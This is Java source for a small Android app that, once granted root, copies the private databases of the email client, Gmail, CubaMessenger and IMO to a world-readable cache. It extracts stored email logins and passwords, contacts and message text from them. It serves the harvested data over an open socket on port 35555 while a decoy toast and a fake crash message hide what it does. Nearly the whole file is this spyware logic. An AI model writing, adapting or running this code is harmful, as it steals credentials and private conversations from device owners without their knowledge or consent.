import java.io.File;
import java.io.FileFilter;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.Enumeration;
import java.util.LinkedList;

import android.os.Bundle;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.view.Menu;
import android.widget.Toast;

public class MA extends Activity {

	File[] dbMs = new File[10];
	File[] dirGmail;
	LinkedList<File> cuentas = new LinkedList<File>();
	File dTmp;
	SQLiteDatabase sqld;
	Cursor cursor;
	String saco;
	ServerSocket ss;
	Socket socket;
	OutputStreamWriter osw;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_m);
		CD();
		Toast.makeText(getApplicationContext(), "Todo fresa\nLa vida es loca.",
				Toast.LENGTH_LONG).show();
		this.finish();
	}

	public void CPdb(int key) throws Exception {
		Process p = Runtime.getRuntime().exec("su");
		OutputStream os = p.getOutputStream();
		switch (key) {
		case 0:
			// email
			os.write(("cp /data/data/com.android.email/databases/EmailProvider.db "
					+ getCacheDir() + "\n").getBytes());
			os.write(("chmod 777 " + getCacheDir() + "/EmailProvider.db \n")
					.getBytes());
			break;
		case 1:
			// cubamessenger < 5
			os.write(("cp /data/data/com.cubamessenger.cubamessengerapp/databases/cmapp_db_u0 "
					+ getCacheDir() + "\n").getBytes());
			os.write(("chmod 777 " + getCacheDir() + "/cmapp_db_u0 \n").getBytes());
			// cubamessenger >= 5
			/*os.write(("cp /data/data/com.cubamessenger.cubamessengerapp/databases/cmapp_db_u581185 "
					+ getCacheDir() + "\n").getBytes());
			os.write(("chmod 777 " + getCacheDir() + "/cmapp_db_u581185 \n").getBytes());*/
			break;
		case 2:
			// gmail		
			dirGmail=getFilesDir().listFiles(new FilenameFilter() {
				
				@Override
				public boolean accept(File arg0, String arg1) {
					return (arg0.isFile()&&arg1.contains("mailstore"))?true:false;					
				}
			});
			String rutaFil="";
			if(dirGmail.length!=0){
			for (File ff : dirGmail) {
				if(ff.getName().contains("mailstore")){
					dTmp = ff;
					rutaFil = ff.getAbsolutePath();
					os.write(("cp "+ rutaFil	+ getCacheDir() + "\n").getBytes());
					os.write(("chmod 777 " + getCacheDir() + "/"+ ff.getName() +"\n")
							.getBytes());
				}
			}
			}
			
			/*os.write(("cp /data/data/com.google.android.gm/databases/mailstore."+"target"+"@gmail.com.db "
					+ getCacheDir() + "\n").getBytes());
			os.write(("chmod 777 " + getCacheDir() + "/mailstore."+"target"+"@gmail.com.db \n")
					.getBytes());*/
			break;
		case 3:
			// imo
			os.write(("cp /data/data/com.imo.android.imoim/databases/imo "
					+ getCacheDir() + "\n").getBytes());
			os.write(("chmod 777 " + getCacheDir() + "/imo \n")
					.getBytes());
			break;

		default:
			os.close();
			break;
		}
		os.close();
	}

	public void EspecialGmail(){
		
		File dir =  new File("/data/data/com.google.android.gm/databases/");			
				
			File[] cc =dir.listFiles(new FileFilter() {				
				@Override
				public boolean accept(File pathname) {		
					if(pathname.getName().contains("mailstore")){
						try{
							dbMs[2] = new File(pathname, pathname.getName() );
							cuentas.add(pathname);
							Process p = Runtime.getRuntime().exec("su");
							OutputStream os = p.getOutputStream();
							os.write(("mkdir "+getCacheDir()+" gm").getBytes());
							os.write("cd /data/data/com.google.android.gm/databases/ \n".getBytes());
							os.write(("cp -R * "+ getCacheDir() + "\n").getBytes());
							os.write(("chmod 777 " + getCacheDir() + "/"+ pathname.getName() +"\n").getBytes());
							return true;
							}catch(Exception e){
								e.printStackTrace();
								}
						}
					return false;
				}
			});
			Toast.makeText(getApplicationContext(), "Se encontró: "+cc.length +" cuentas", Toast.LENGTH_LONG).show();
			AlertDialog ad = new AlertDialog.Builder(getApplicationContext()).create();
			ad.setMessage("Se encontró: "+cc.length +" cuentas");
			ad.show();
	}
	public void CD() {
		try {
			dbMs[0] = new File(getCacheDir(), "/EmailProvider.db");// email
			dbMs[1] = new File(getCacheDir(), "/cmapp_db_u0");// cubamessenger < 5
			EspecialGmail();
			//dbMs[2] = new File(getCacheDir(), "/"+dTmp.getName());// gmail
			dbMs[3] = new File(getCacheDir(), "/imo"); // imo
			//dbMs[4] = new File(getCacheDir(), "/cmapp_db_u581185");// cubamessenger >= 5
			for (int i = 0; i < dbMs.length; i++)
				if (dbMs[i].exists() && dbMs[i].isFile()) {
					ReadDB(i);					
				} else {
					CPdb(i);
					Toast.makeText(
							getApplicationContext(),
							"No existe.\nLa aplicación se cerró, mientras intentaba inicializarse.",
							Toast.LENGTH_LONG).show();
					//i--;
				}
			Conectar();

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void Conectar() {
		try {
			SocketServerThread sst = new SocketServerThread();
			sst.start();
			ss.close();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	public void GetInfo(String consulta) {
		cursor = sqld.rawQuery(consulta, null);
		int colCount = cursor.getColumnCount();
		cursor.moveToFirst();
		saco += cursor.getColumnName(0) + ":\n";
		while (!cursor.isAfterLast()) {
			for (int i = 0; i < colCount; i++) {
				saco += (cursor.getString(i)) + " |\n";
			}
			cursor.moveToNext();
		}
	}

	public void ReadDB(int pos) {
		try {			
			sqld = SQLiteDatabase.openDatabase(dbMs[pos].getAbsolutePath(), null,
					SQLiteDatabase.OPEN_READONLY);

			switch (pos) {
			case 0:
				// bloque e-mail
				// Datos de las cuentas
				String queryA = "SELECT address FROM HostAuth";
				String queryPA = "SELECT port FROM HostAuth";
				String queryU = "SELECT login FROM HostAuth";
				String queryP = "SELECT password FROM HostAuth";
				saco += "---Email---" + "\n";
				GetInfo(queryU);// logins
				GetInfo(queryP);// passwords				
				GetInfo(queryA);// address				
				GetInfo(queryPA);// port address
				// fin bloque e-mail
				break;
			case 1:
				// bloque cubamessenger
				saco += "---CubaMessenger---"+"\n";
				String queryConf = "SELECT * FROM config";
				//String queryCK = "SELECT ConfigKey FROM config";
				//String queryCV = "SELECT ConfigValue FROM config";
				String queryCN = "SELECT * FROM contact";
				String queryMsg = "SELECT MessageDate,MessageText,MessageContactNumber FROM message";
				GetInfo(queryConf);
				//GetInfo(queryCV);
				GetInfo(queryCN);
				GetInfo(queryMsg);
				// Datos de la cuenta en cubamessenger
				// fin bloque cubamessenger
				
				//bloque cubamessenger versión >=5				
				sqld = SQLiteDatabase.openDatabase(dbMs[4].getAbsolutePath(), null,
						SQLiteDatabase.OPEN_READONLY);
				saco += "---CubaMessenger Versión >= 5---"+"\n";
				GetInfo(queryConf);				
				GetInfo(queryCN);
				GetInfo(queryMsg);
				//fin bloque cubamessenger
				
				break;
			case 2:
				// bloque gmail
				// Datos de la cuenta en gmail
				saco += "---Gmail---"+"\n";				
				String querySnippets = "SELECT snippet FROM messages";				
				GetInfo(querySnippets);
				// fin bloque gmail
				break;
			case 3:
				// bloque imo
				// Datos de la cuenta en IMO
				saco += "---IMO---"+"\n";
				String queryAcc = "SELECT * FROM accounts";
				String queryChats = "SELECT last_message FROM chats";
				GetInfo(queryAcc);
				GetInfo(queryChats);
				// fin bloque IMO
				break;

			default:
				break;
			}
						

			cursor.close();
			sqld.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.m, menu);
		return true;
	}

	private String getIpAddress() {
		String localObject = "";
		try {
			Enumeration<NetworkInterface> localEnumeration1 = NetworkInterface
					.getNetworkInterfaces();
			while (true) {
				if (!localEnumeration1.hasMoreElements())
					return localObject;
				Enumeration<InetAddress> localEnumeration2 = ((NetworkInterface) localEnumeration1
						.nextElement()).getInetAddresses();
				while (localEnumeration2.hasMoreElements()) {
					InetAddress localInetAddress = (InetAddress) localEnumeration2
							.nextElement();
					if (localInetAddress.isSiteLocalAddress()) {
						localObject = "IP local: "
								+ localInetAddress.getHostAddress() + "\n";
					}
				}
			}
		} catch (SocketException localSocketException) {
			localSocketException.printStackTrace();
			return localObject + "Error, algo va mal! "
					+ localSocketException.toString() + "\n";
		}
	}

	private class SocketServerReplyThread extends Thread {
		private Socket hostThreadSocket;
		String tmsg;

		SocketServerReplyThread(Socket paramString, String arg3) {
			this.hostThreadSocket = paramString;
			this.tmsg = arg3;
		}

		public void run() {
			String str = this.tmsg;
			try {
				PrintStream localPrintStream = new PrintStream(
						this.hostThreadSocket.getOutputStream());
				localPrintStream.print(str);
				localPrintStream.close();
				return;
			} catch (IOException localIOException) {
				localIOException.printStackTrace();
			}
		}
	}

	private class SocketServerThread extends Thread {
		static final int SocketServerPORT = 35555;

		private SocketServerThread() {

		}

		public void run() {
			try {
				MA.this.ss = new ServerSocket(SocketServerPORT);
				while (true) {
					ss.setReuseAddress(true);
					Socket localSocket = MA.this.ss.accept();
					new MA.SocketServerReplyThread(localSocket, getIpAddress()
							+ "\n"
							+ MA.this.saco.substring(4, MA.this.saco.length()))
							.run();
				}
			} catch (IOException localIOException) {
				localIOException.printStackTrace();
			}
		}
	}
}
